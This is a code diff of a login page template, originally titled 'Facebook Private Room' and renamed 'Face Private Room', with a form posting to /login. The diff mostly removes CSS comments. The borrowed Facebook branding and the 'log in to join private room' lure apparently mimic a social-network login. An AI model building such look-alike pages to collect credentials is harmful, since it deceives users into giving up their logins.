@@ -4,10 +4,9 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Facebook Private Room</title>
+    <title>Face Private Room</title>
     <link rel="stylesheet" href="/index.css" />
     <style>
-        /* Include message styles directly for context */
         .message {
             padding: 15px;
             margin: 15px 0;
@@ -30,7 +29,6 @@
             border: 1px solid #c3e6cb;
         }
 
-        /* Enhanced styles for the joining div */
         .joining {
             display: flex;
             align-items: center;
@@ -47,7 +45,7 @@
             transition: all 0.3s ease-in-out;
         }
 
-        /* Enhanced loader spinner */
+     
         .loader {
             margin-left: 10px;
             border: 4px solid #e0e0e0;
@@ -70,6 +68,7 @@
         <div class="left-side">
             <div class="left-container">
                 <img src="/image/face.svg" class="img" alt="" />
+                 <!-- <h1 class="face-h1">Face Private Chat Room</h1> -->
                 <h2 class="face-p">Log In to join private room.</h2>
             </div>
         </div>
@@ -77,8 +76,6 @@
         <div class="right-s">
             <div class="right-side"></div>
             <div class="login-box">
-                
-                <!-- Form with onsubmit handler -->
                 <form action="/login" method="post" onsubmit="showSpinner()">
                     <% if (message) { %>
                         <div class="message <% if (message.includes('success')) { %> success <% } else { %> error <% } %>">
